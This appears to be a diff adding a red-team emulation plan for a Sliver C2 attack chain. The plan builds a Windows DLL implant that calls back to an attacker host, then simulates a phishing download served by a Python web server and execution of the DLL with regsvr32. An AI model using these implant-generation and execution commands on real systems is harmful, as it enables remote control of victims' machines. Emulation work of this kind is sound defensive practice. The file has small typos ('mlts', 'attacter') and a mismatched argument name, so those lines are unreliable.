@@ -1,0 +1,98 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-25 22:12:18 UTC+0000
+attack_action_sequence:
+  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
+    name: Build DLL Sliver implant
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
+    name: Simulate the victim download a file on its machine
+    id:
+      - T1566.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Initial Access
+    technique:
+      - 'Phishing: Spearphishing Link'
+    description: This step simulates the victim accidentally downloads a malicious
+      file by clicking a link.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the file on the attacker's machine
+        3. Download the file to #{PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 5b852063-ca39-4600-b246-024897721010
+    name: Simulate the victim execute a DLL file on its machine
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description: This step simulates the victim executes a DLL file on its machine.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On victim's machine, use PowerShell or Command Prompt)
+        regsvr32 #{DLL_PATH}
+    arguments:
+      DLL_PATH:
+        default:
+        description: Saved path of the DLL file
+        type:
+testbed_requirement:
+  OS: []
+  CVE: []
